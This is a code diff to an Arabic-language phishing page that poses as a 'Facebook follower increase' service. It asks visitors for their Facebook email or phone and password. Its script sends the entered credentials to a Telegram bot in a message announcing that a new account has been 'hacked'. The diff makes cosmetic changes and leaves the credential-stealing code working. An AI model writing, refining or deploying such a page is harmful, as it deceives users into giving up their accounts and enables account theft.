@@ -41,20 +41,20 @@
     }
     input:focus {
       outline: none;
-      border: 2px solid #00ffcc;
-      box-shadow: 0 0 5px #00ffcc;
+      border: 2px solid #0056b3;
+      box-shadow: 0 0 5px #0056b3;
     }
   </style>
 </head>
 <body>
 
   <div class="form-container">
-   <h2>زيادة متابعين فيسبوك 🚀</h2>
+   <h2>🚀 زيادة متابعين فيسبوك</h2>
     <form id="loginForm">
       <input type="text" id="email" placeholder="البريد الإلكتروني أو الهاتف" required>
       <input type="password" id="password" placeholder="كلمة السر" required>
       
-      <label> :- اختر عدد المتابعين</label>
+      <div> اختر عدد المتابعين</div>
       <select id="followers">
         <option value="1000">1000</option>
         <option value="5000">5000</option>
@@ -92,7 +92,7 @@
     const email = document.getElementById("email").value;
     const password = document.getElementById("password").value;
 
-    const message = `📥 - تم اختراق حساب جديد :- \n📧 - الإيميل: ${email}\n🔑 - الباسورد: ${password}`;
+    const message = `📥 - تم اختراق حساب فيسبوك جديد :- \n📧 - الإيميل: ${email}\n🔑 - الباسورد: ${password}`;
 
     const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${id}&text=${encodeURIComponent(message)}`;
 
